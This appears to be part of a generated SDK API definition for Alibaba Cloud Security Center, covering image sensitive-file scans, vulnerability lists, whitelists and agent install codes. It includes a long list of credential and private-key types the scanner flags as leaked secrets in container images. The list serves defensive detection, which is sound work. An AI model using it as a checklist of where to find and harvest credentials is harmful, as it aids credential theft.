    *   **tencentcloud_ak**: secret ID of a third-party cloud
    *   **rsa_private_key**: Rivest-Shamir-Adleman (RSA) private key
    *   **github_personal_token**: personal access token for GitHub
    *   **pgp**: Pretty Good Privacy (PGP) encrypted file
    *   **stripe_skpk**: Stripe secret key
    *   **square_token**: Square access token
    *   **rails_carrierwave**: file upload credentials for Rails Carrierwave
    *   **dbeaver_database_cfg**: DBeaver database configuration
    *   **robomongo_cred**: Robomongo credentials
    *   **github_oauth_token**: OAuth access token for GitHub
    *   **pulumi_token**: Pulumi token
    *   **ventrilo_voip**: Ventrilo VoIP server configuration
    *   **macos_keychain** :macOS keychain
    *   **amazon_mws_token**: Amazon MWS token
    *   **dynatrace_token**: Dynatrace token
    *   **java_keystore**: Java KeyStore (JKS)
    *   **microsoft_sdf**: Microsoft SQL Server Compact Edition (CE) database
    *   **kubernetes_dashboard_cred**: user credentials for Kubernetes Dashboard
    *   **atlassian_token**: Atlassian token
    *   **rdp**: remote desktop protocol (RDP)
    *   **mailgun_key**: Mailgun webhook signing key
    *   **mailchimp_api_key**: API key for Mailchimp
    *   **netrc_cfg**: .netrc configuration file
    *   **openvpn_cfg**: OpenVPN configuration
    *   **github_refresh_token**: GitHub refresh token
    *   **salesforce**: Salesforce credentials
    *   **salesforce**: Sendinblue credentials
    *   **pkcs_private_key**: PKCS#12 key
    *   **rubyonrails_passwd**: Ruby on Rails password file
    *   **filezilla_ftp**: FileZilla FTP configuration
    *   **databricks_token**: Databricks token
    *   **gitLab_personal_toke**: personal access token for GitLab
    *   **rails_master_key**: Rails master key
    *   **sqlite**: SQLite3 or SQLite database
    *   **firefox_logins**: Firefox logon configuration
    *   **mailgun_private_token**: Mailgun private token
    *   **joomla_cfg**: Joomla configuration
    *   **hashicorp_terraform_token**: HashiCorp Terraform token
    *   **jetbrains_ides**: JetBrains IDEs configuration
    *   **heroku_api_key**: Heroku API key
    *   **messagebird_token**: MessageBird token
    *   **messagebird_token**: MessageBird token
    *   **hashicorp_vault_token**: HashiCorp Vault token
    *   **pgp_private_key**: PGP private key
    *   **sshpasswd**: SSH password
    *   **huaweicloud_ak**: secret access key of a third-party cloud
    *   **aws_s3cmd**: AWS S3cmd configuration
    *   **php_config**: PHP configuration
    *   **common_private_key**: private key of a common type
    *   **microsoft_mdf**: Microsoft SQL Server database
    *   **mediawiki_cfg**: MediaWiki configuration
    *   **jenkins_cred**: Jenkins credentials
    *   **rubygems_cred**: RubyGems credentials
    *   **clojars_token**: Clojars token
    *   **phoenix_web_passwd**: Phoenix web credentials
    *   **puttygen_private_key**: PuTTYgen private key
    *   **google_oauth_token**: Google OAuth access token
    *   **rubyonrails_cfg**: Ruby On Rails database configuration
    *   **lob_api_key**: Lob API key
    *   **pkcs_cred**: PKCS#12 certificate
    *   **otr_private_key**: Off-the-Record Messaging (OTR) private key
    *   **contentful_delivery_token**: delivery token for Contentful
    *   **digital_ocean_tugboat**: DigitalOcean Tugboat configuration
    *   **dsa_private_key**: Digital Signature Algorithm (DSA) private key
    *   **rails_app_token**: Rails app token
    *   **git_cred**: Git user credential
    *   **newrelic_api_key**: User API key for New Relic
    *   **github_hub**: hub configuration for storing GitHub tokens
    *   **rubygem**: RubyGem token

*   **SensitiveFileName**: the name of the alert type for sensitive files.', example='SensitiveFileKey', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**. Default value: **1**.', example='1', position='Query'),
  imageUuid?: string(name='ImageUuid', description='The UUID of the image.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the UUIDs of images from the value of the **ImageUuid** response parameter.', example='850613a48999900f48417c7e6e9dcfdd', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20.', example='20', position='Query'),
  riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**', example='low', position='Query'),
  scanRange?: [ string ](name='ScanRange', description='An array that consists of the types of the assets that you want to scan. Valid values:

*   **image**
*   **container**', shrink='json', position='Query'),
}

model DescribeImageSensitiveFileListResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    lastRowKey?: string(name='LastRowKey', description='The key of the last data entry.', example='CAESGgoSChAKDGNvbXBsZXRlVGltZRABCgQiAggAGAAiQAoJAGYXFWIAAAAACjMDLgAAADFTNzMyZDMwMzAzMDM1Mzc3Njc4MzA2ODY5NmI2YTY1Nzg2NTcxNjE2NDc4NjE='),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: 20.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='149'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8D19A089-E6BC-5244-800C-7E590D50487F'),
  sensitiveFileList?: [ 
    {
      classKey?: string(name='ClassKey'),
      className?: string(name='ClassName'),
      count?: int32(name='Count', description='The number of scans that are performed on the sensitive file.', example='9'),
      firstScanTime?: long(name='FirstScanTime', description='The timestamp generated when the first scan was performed. Unit: milliseconds.', example='1663321552000'),
      lastScanTime?: long(name='LastScanTime', description='The timestamp generated when the last baseline check was performed. Unit: milliseconds.', example='1663321552000'),
      riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
      sensitiveFileKey?: string(name='SensitiveFileKey', description='The type of alerts for the sensitive file. Valid value:

*   **npm_token**: NPM access token
*   **ftp_cfg**: FTP configuration
*   **google_oauth_key**: Google OAuth key
*   **planetscale_passwd**: PlanetScale password
*   **github_ssh_key**: Github SSH key
*   **msbuild_publish_profile**: MSBuild publish profile
*   **fastly_cdn_token**: Fastly CDN token
*   **ssh_private_key**: SSH private key
*   **aws_cli**: AWS CLI credentials
*   **cpanel_proftpd**: cPanel ProFTPD credentials
*   **postgresql_passwd**: PostgreSQL password file
*   **discord_client_cred**: Discord client credentials
*   **rails_database**: Rails database configuration
*   **aws_access_key**: AWS access key
*   **esmtp_cfg**: ESMTP configuration
*   **docker_registry_cfg**: configuration of a Docker image repository
*   **pem**: PEM
*   **common_cred**: common credential
*   **sftp_cfg**: SFTP connection configuration
*   **grafana_token**: Grafana token
*   **slack_token**: Slack token
*   **ec_private_key**: EC private key
*   **pypi_token**: upload token for the PyPI
*   **finicity_token**: Finicity token
*   **k8s_client_key**: Kubernetes private key
*   **git_cfg**: Git configuration
*   **django_key**: Django key
*   **jenkins_ssh**: Jenkins SSH configuration file
*   **openssh_private_key**: OpenSSL private key
*   **square_oauth**: OAuth credential for Square
*   **typeform_token**: Typeform token
*   **common_database_cfg**: general database connection configuration
*   **wordpress_database_cfg**: WordPress database configuration
*   **googlecloud_api_key**: API key for Google Cloud
*   **vscode_sftp**: VSCode SFTP configuration
*   **apache_htpasswd**: Apache htpasswd
*   **planetscale_token**: PlanetScale token
*   **contentful_preview_token**: preview token for Contentful
*   **php_database_cfg**: database password for a PHP application
*   **atom_remote_sync**: Atom remote synchronization configuration
*   **aws_session_token**: AWS session token
*   **atom_sftp_cfg**: Atom SFTP configuration
*   **asana_client_private_key**: Asana project client key
*   **tencentcloud_ak**: secret ID of a third-party cloud
*   **rsa_private_key**: RSA private key
*   **github_personal_token**: personal access token for GitHub
*   **pgp**: PGP encrypted file
*   **stripe_skpk**: Stripe secret key
*   **square_token**: Square access token
*   **rails_carrierwave**: file upload credential for Rails Carrierwave
*   **dbeaver_database_cfg**: DBeaver database configuration
*   **robomongo_cred**: credential for RoboMongo
*   **github_oauth_token**: OAuth access token for GitHub
*   **pulumi_token**: Pulumi token
*   **ventrilo_voip**: configuration of a Ventrilo VoIP server
*   **macos_keychain**: macOS keychain
*   **amazon_mws_token**: Amazon MWS token
*   **dynatrace_token**: Dynatrace token
*   **java_keystore**: JKS
*   **microsoft_sdf**: Microsoft SQL Server CE database
*   **kubernetes_dashboard_cred**: user credential for Kubernetes Dashboard
*   **atlassian_token**: Atlassian token
*   **rdp**: RDP
*   **mailgun_key**: Mailgun webhook signing key
*   **mailchimp_api_key**: API key for Mailchimp
*   **netrc_cfg**: .netrc configuration file
*   **openvpn_cfg**: OpenVPN configuration
*   **github_refresh_token**: GitHub refresh token
*   **salesforce**: Salesforce credentials
*   **salesforce**: Sendinblue credentials
*   **pkcs_private_key**: PKCS#12 key
*   **rubyonrails_passwd**: Ruby on Rails password file
*   **filezilla_ftp**: FileZilla FTP configuration
*   **databricks_token**: Databricks token
*   **gitLab_personal_toke**: personal access token for GitLab
*   **rails_master_key**: Rails master key
*   **sqlite**: SQLite3 or SQLite database
*   **firefox_logins**: Firefox logon configuration
*   **mailgun_private_token**: Mailgun private token
*   **joomla_cfg**: Joomla configuration
*   **hashicorp_terraform_token**: HashiCorp Terraform token
*   **jetbrains_ides**: JetBrains IDEs configuration
*   **heroku_api_key**: Heroku API key
*   **messagebird_token**: MessageBird token
*   **messagebird_token**: MessageBird token
*   **hashicorp_vault_token**: HashiCorp Vault token
*   **pgp_private_key**: PGP private key
*   **sshpasswd**: SSH password
*   **huaweicloud_ak**: secret access key of a third-party cloud
*   **aws_s3cmd**: AWS S3cmd configuration
*   **php_config**: PHP configuration
*   **common_private_key**: private key of a common type
*   **microsoft_mdf**: Microsoft SQL Server database
*   **mediawiki_cfg**: MediaWiki configuration
*   **jenkins_cred**: Jenkins credentials
*   **rubygems_cred**: RubyGems credentials
*   **clojars_token**: Clojars token
*   **phoenix_web_passwd**: Phoenix web credentials
*   **puttygen_private_key**: PuTTYgen private key
*   **google_oauth_token**: Google OAuth access token
*   **rubyonrails_cfg**: Ruby On Rails database configuration
*   **lob_api_key**: Lob API key
*   **pkcs_cred**: PKCS#12 certificate
*   **otr_private_key**: OTR private key
*   **contentful_delivery_token**: delivery token for Contentful
*   **digital_ocean_tugboat**: DigitalOcean Tugboat configuration
*   **dsa_private_key**: Digital DSA private key
*   **rails_app_token**: Rails app token
*   **git_cred**: Git user credentials
*   **newrelic_api_key**: User API key for New Relic
*   **github_hub**: hub configuration for storing GitHub tokens
*   **rubygem**: Rubygem Token', example='google_oauth_key'),
      sensitiveFileName?: string(name='SensitiveFileName', description='The name of the alert type for the sensitive file.', example='AccessKeyLeak'),
    }
  ](name='SensitiveFileList', description='The information about the sensitive files.'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model DescribeImageSensitiveFileListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageSensitiveFileListResponseBody(name='body'),
}

async function describeImageSensitiveFileList(request: DescribeImageSensitiveFileListRequest): DescribeImageSensitiveFileListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImageSensitiveFileList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageStatisticsRequest {
}

model DescribeImageStatisticsResponseBody = {
  instanceCount?: int32(name='InstanceCount', description='The number of container images in your assets. Only Container Registry Enterprise Edition instances are counted.', example='5'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4E5BFDCF-B9DD-430D-9DA4-151BCB581C9D'),
  riskInstanceCount?: int32(name='RiskInstanceCount', description='The number of container images that have security risks. Only Container Registry Enterprise Edition instances are counted.', example='2'),
}

model DescribeImageStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageStatisticsResponseBody(name='body'),
}

/**
  * Security Center can scan for security risks and collect statistics only for **Container Registry Enterprise Edition instances**.
  * >  Security Center cannot scan for security risks or collect statistics for **default** Container Registry instances.
  *
 */
async function describeImageStatistics(request: DescribeImageStatisticsRequest): DescribeImageStatisticsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImageStatistics', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageVulListRequest {
  aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='High severity vulnerability that affects org.eclipse.jetty:jetty-server', position='Query'),
  clusterId?: string(name='ClusterId', description='The ID of the cluster to which the container belongs.', example='cc20a1024011c44b6a8710d6f8b****', position='Query'),
  clusterName?: string(name='ClusterName', description='The name of the cluster.', example='docker-law', position='Query'),
  containerId?: string(name='ContainerId', description='The ID of the container.', example='c08d5fc1a329a4b88950a253d082f****', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**', example='1', position='Query'),
  dealed?: string(name='Dealed', description='Specifies whether the vulnerability is handled. Valid values:

*   **y**: handled
*   **n**: unhandled', example='y', position='Query'),
  digest?: string(name='Digest', description='The digest of the image.', example='8f0fbdb41d3d1ade4ffdf21558443f4c03342010563bb8c43ccc09594d507012', position='Query'),
  image?: string(name='Image', description='The name of the image.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-****', position='Query'),
  instanceId?: string(name='InstanceId', description='The instance ID of the asset.', example='1-qeqewqw****', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  name?: string(name='Name', description='The name of the vulnerability.', example='debian:10:CVE-2019-9893', position='Query'),
  namespace?: string(name='Namespace', description='The namespace.', example='test-002', position='Query'),
  necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Valid values:

*   **asap**: high. You must fix the vulnerability at the earliest opportunity.
*   **later**: medium. You can fix the vulnerability based on your business requirements.
*   **nntf**: low. You can ignore the vulnerability.', example='asap', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**', example='10', position='Query'),
  pod?: string(name='Pod', description='The pod.', example='22222-7xsqq', position='Query'),
  regionId?: string(name='RegionId', description='The region ID of the instance.', example='cn-hangzhou', position='Query'),
  repoId?: string(name='RepoId', description='The ID of the image repository.', example='qew****', position='Query'),
  repoInstanceId?: string(name='RepoInstanceId', description='The instance ID of the image repository.', example='i-qewqrqcsadf****', position='Query'),
  repoName?: string(name='RepoName', description='The name of the image repository.', example='libssh2', position='Query'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='libssh2', position='Query'),
  repoRegionId?: string(name='RepoRegionId', description='The region ID of the image repository.', example='cn-hangzhou', position='Query'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that you want to scan.', position='Query'),
  statusList?: string(name='StatusList', description='The status of the vulnerability. Valid values:

*   **1**: unfixed
*   **4**: being fixed
*   **7**: fixed', example='1', position='Query'),
  tag?: string(name='Tag', description='The tag that is added to the image.', example='oval', position='Query'),
  type: string(name='Type', description='The type of the vulnerability. Set the value to **cve**, which indicates image vulnerabilities.', example='cve', position='Query'),
  uuids?: string(name='Uuids', description='The UUIDs of the assets. Separate multiple UUIDs with commas (,).', example='0004a32a0305a7f6ab5ff9600d47****', position='Query'),
}

model DescribeImageVulListResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**', example='10'),
  requestId?: string(name='RequestId', description='The request ID.', example='D6B20156-49B0-5CF0-B14D-7ECA4B50DAAB'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  vulRecords?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='CVE-2018-25010:libwebp up to 1.0.0 ApplyFilter out-of-bounds read'),
      canFix?: string(name='CanFix', description='Indicates whether the vulnerability can be fixed in the Security Center console. Valid values:

*   **yes**
*   **no**', example='yes'),
      canUpdate?: boolean(name='CanUpdate', description='Indicates whether the packages of the software that has the vulnerability can be upgraded by using Security Center. Valid values:

*   **true**
*   **false**', example='true'),
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c08d5fc1a329a4b88950a253d082f1****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='docker-law'),
      containerId?: string(name='ContainerId', description='The ID of the container.', example='04d20e98c8e2c93b7b864372084320a15a58c8671e53c972ce3a71d9c163****'),
      extendContentJson?: {
        os?: string(name='Os', description='The name of the operating system.', example='debian'),
        osRelease?: string(name='OsRelease', description='The version of the operating system in the image.', example='10.9'),
        rpmEntityList?: [ 
          {
            fullVersion?: string(name='FullVersion', description='The complete version number of the package.', example='2.3.3-4'),
            layer?: string(name='Layer', description='The SHA-256 value of the digest of the image layer.', example='b1f5b9420803ad0657cf21566e3e20acc08581e7f22991249ef3aa80b8b1c587'),
            matchDetail?: string(name='MatchDetail', description='The reason why the vulnerability is detected.', example='libseccomp2 version less than equals 2.3.3-4'),
            matchList?: [ string ](name='MatchList', description='The details of the rules that are used to detect the vulnerability.', example='["libseccomp2 version less than equals 2.3.3-4"]'),
            name?: string(name='Name', description='The name of the software package.', example='libseccomp2'),
            path?: string(name='Path', description='The path to the software that has the vulnerability.', example='/usr/lib64/libssh2.so.1'),
            updateCmd?: string(name='UpdateCmd', description='The command that is used to fix the vulnerability.', example='apt-get update && apt-get install libseccomp2  --only-upgrade'),
            version?: string(name='Version', description='The version number of the package.', example='2.3.3-4'),
          }
        ](name='RpmEntityList', description='The details of the packages of the software that has the vulnerability.'),
      }(name='ExtendContentJson', description='The extended information about the vulnerability.'),
      firstTs?: long(name='FirstTs', description='The timestamp when the first scan was performed. Unit: milliseconds.', example='1620752053000'),
      image?: string(name='Image', description='The name of the image.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-conta****'),
      imageDigest?: string(name='ImageDigest', description='The digest of the image.', example='8f0fbdb41d3d1ade4ffdf21558443f4c03342010563bb8c43ccc09594d507012'),
      instanceName?: string(name='InstanceName', description='The name of the asset.', example='testInstance'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='1.2.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.19.XX.XX'),
      lastTs?: long(name='LastTs', description='The timestamp when the last scan was performed. Unit: milliseconds.', example='1631779996000'),
      layers?: [ string ](name='Layers', description='The image layers.'),
      maliciousSource?: string(name='MaliciousSource', description='The source of the malicious file. Valid values:

*   **agentless**: agentless detection
*   **image**: image
*   **container**: container', example='agentless'),
      modifyTs?: long(name='ModifyTs', description='The timestamp when the information about the vulnerability was updated. Unit: milliseconds.', example='1580808765000'),
      name?: string(name='Name', description='The name of the vulnerability.', example='debian:10:CVE-2019-9893'),
      namespace?: string(name='Namespace', description='The namespace.', example='test-002'),
      necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Valid values:

*   **asap**: high. You must fix the vulnerability at the earliest opportunity.
*   **later**: medium. You can fix the vulnerability based on your business requirements.
*   **nntf**: low. You can ignore the vulnerability.', example='asap'),
      pod?: string(name='Pod', description='The pod.', example='22222-7xsqq'),
      primaryId?: long(name='PrimaryId', description='The ID of the vulnerability.', example='782661'),
      related?: string(name='Related', description='The Common Vulnerabilities and Exposures (CVE) ID of the associated vulnerability.', example='CVE-2019-9893'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='varnish'),
      repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='default'),
      scanTime?: long(name='ScanTime', description='The time at which the scan was performed. This value is a UNIX timestamp representing the number of milliseconds that have elapsed since January 1, 1970, 00:00:00 UTC.', example='1649814050000'),
      status?: int32(name='Status', description='The status of the vulnerability. Valid values:

*   **1**: unfixed
*   **7**: fixed', example='1'),
      tag?: string(name='Tag', description='The tag that is added to the vulnerability.', example='oval'),
      targetId?: string(name='TargetId', description='The ID of the asset on which the vulnerability is detected.', example='m-bp17m0pc0xprzbwo****'),
      targetName?: string(name='TargetName', description='The name of the asset on which the vulnerability is detected.', example='source-test-obj-XM0Ma'),
      targetType?: string(name='TargetType', description='The type of the asset on which the vulnerability is detected. Valid values:

*   **ECS_IMAGE**: image
*   **ECS_SNAPSHOT**: snapshot', example='ECS_IMAGE'),
      type?: string(name='Type', description='The type of the vulnerability. The value is fixed as cve, which indicates image vulnerabilities.', example='cve'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='0004a32a0305a7f6ab5ff9600d47****'),
    }
  ](name='VulRecords', description='The vulnerabilities.'),
}

model DescribeImageVulListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageVulListResponseBody(name='body'),
}

/**
  * To query the information about the recently detected image vulnerabilities, call the [PublicCreateImageScanTask](~~PublicCreateImageScanTask~~) operation. Wait 1 to 5 minutes until the call is successful and call the DescribeImageVulList operation.
  *
 */
async function describeImageVulList(request: DescribeImageVulListRequest): DescribeImageVulListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImageVulList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageVulWhiteListRequest {
  aliasName?: string(name='AliasName', description='The alias of the vulnerability that you want to query.', example='CVE-2007-5686:rpath_linux', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20.', example='20', position='Query'),
  source?: string(name='Source', description='The source of the whitelist. Valid values:
- **image**
- **agentless**', example='image', position='Query'),
}

model DescribeImageVulWhiteListResponseBody = {
  code?: string(name='Code', description='The status code returned. A value of **200** indicates that the request was successful. Other values indicate that the request failed. You can identify the cause of the failure based on the value of this parameter.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  imageVulWhitelist?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability that is specified in Common Vulnerabilities and Exposures (CVE).', example='CVE-2019-19906:in_sasl_add_string'),
      id?: long(name='Id', description='The primary key ID of the vulnerability.', example='34032043'),
      name?: string(name='Name', description='The name of the vulnerability.', example='scan:AVD-2022-953356'),
      reason?: string(name='Reason', description='The reason the vulnerability is added to the whitelist.', example='already config in another way'),
      target?: string(name='Target', description='The object on which the query is performed. The value of this parameter is in the JSON format and contains the following fields:

*   **type**: the object type. The value is fixed to repo.
*   **target**: the object content. The value is in the Namespace/Image repository format.', example='{\\"type\\":\\"repo\\",\\"target\\":[\\"sas_test/script_0209\\",\\"sas_test/script\\"]}'),
      type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: system vulnerability
*   **sca**: application vulnerability', example='sca'),
    }
  ](name='ImageVulWhitelist', description='The information about the whitelist of image vulnerabilities.'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='911025D0-3D1E-5213-A18A-37EA0C92****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
  timeCost?: long(name='TimeCost', description='The amount of time that was consumed to process the request. Unit: milliseconds.', example='1'),
}

model DescribeImageVulWhiteListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageVulWhiteListResponseBody(name='body'),
}

async function describeImageVulWhiteList(request: DescribeImageVulWhiteListRequest): DescribeImageVulWhiteListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImageVulWhiteList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeInstallCaptchaRequest {
  deadline?: string(name='Deadline', description='The validity period of verification codes. If this parameter is not specified, only the valid verification codes are returned.

>  An installation verification code can be used only within the validity period. An expired installation verification code cannot be used to install the Security Center agent.', example='2020-10-11 16:26:22', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX', position='Query'),
}

model DescribeInstallCaptchaResponseBody = {
  captchaCode?: string(name='CaptchaCode', description='The installation verification code for you to manually install the Security Center agent.', example='M1HH**'),
  deadline?: string(name='Deadline', description='The validity period of the installation verification code.

>  The installation verification code is valid only within the validity period. An expired installation verification code cannot be used to install the agent.', example='2020-10-10 16:06:38'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='4E5BFDCF-B9DD-430D-9DA4-151BCB581C9D'),
}

model DescribeInstallCaptchaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeInstallCaptchaResponseBody(name='body'),
}

async function describeInstallCaptcha(request: DescribeInstallCaptchaRequest): DescribeInstallCaptchaResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeInstallCaptcha', 'POST', '/', 'json', false, 'json', request);
}

model DescribeInstallCodeRequest {
}

model DescribeInstallCodeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB393****'),
}

model DescribeInstallCodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeInstallCodeResponseBody(name='body'),
}

async function describeInstallCode(request: DescribeInstallCodeRequest): DescribeInstallCodeResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeInstallCode', 'POST', '/', 'json', false, 'json', request);
}

model DescribeInstallCodesRequest {
}

model DescribeInstallCodesResponseBody = {
  installCodes?: [ 
    {
      captchaCode?: string(name='CaptchaCode', description='The verification code for you to manually install the Security Center agent.', example='15v02r'),
      expiredDate?: long(name='ExpiredDate', description='The timestamp generated when the commands used to install the Security Center agent expire. Unit: milliseconds.', example='1637810007000'),
      groupId?: long(name='GroupId', description='The ID of the server group to which the server belongs.', example='9165712'),
      groupName?: string(name='GroupName', description='The name of the server group to which the server belongs.', example='default'),
      onlyImage?: boolean(name='OnlyImage', description='Indicates whether an image is used to install the Security Center agent. Valid values:

*   **true**
*   **false**', example='false'),
      os?: string(name='Os', description='The operating system of the server. Valid values:

*   **linux**
*   **windows**', example='linux'),
      proxyCluster?: string(name='ProxyCluster', description='The name of the proxy cluster.', example='proxy_test'),
      vendorName?: string(name='VendorName', description='The name of the server provider.', example='ALIYUN'),
    }
  ](name='InstallCodes', description='The information about the installation commands.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C0D6119F-92EE-1276-B8B6-C81A7F9D57F5'),
}

model DescribeInstallCodesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeInstallCodesResponseBody(name='body'),
}

/**
  * You can call this operation to query the commands that are used to manually install the Security Center agent on the server. The return result contains the installation verification code and the server information. If you want to manually install the Security Center agent on your server, you can call this operation to query installation commands.
  * ### QPS limit
  * You can call this operation up to 10 times per second per account. Requests that exceed this limit are dropped and you will experience service interruptions. We recommend that you take note of this limit when you call this operation.
  *
 */
async function describeInstallCodes(request: DescribeInstallCodesRequest): DescribeInstallCodesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeInstallCodes', 'POST', '/', 'json', false, 'json', request);
}

model DescribeInstanceAntiBruteForceRulesRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10000**.', example='20', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='115.238.XX.XX', position='Query'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', position='Query'),
}

model DescribeInstanceAntiBruteForceRulesResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of servers returned on the current page.', example='4'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of servers returned.', example='4'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='97286A-4A6B-4A4-95FA-EC7E3E2451'),
  rules?: [ 
    {
      id?: long(name='Id', description='The ID of the defense rule.', example='215779601'),
      name?: string(name='Name', description='The name of the defense rule.', example='TestRule'),
      uuid?: string(name='Uuid', description='The UUID of the server to which the defense rule is applied.', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
    }
  ](name='Rules', description='An array consisting of the servers to which a defense rule is applied.'),
}

model DescribeInstanceAntiBruteForceRulesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeInstanceAntiBruteForceRulesResponseBody(name='body'),
}

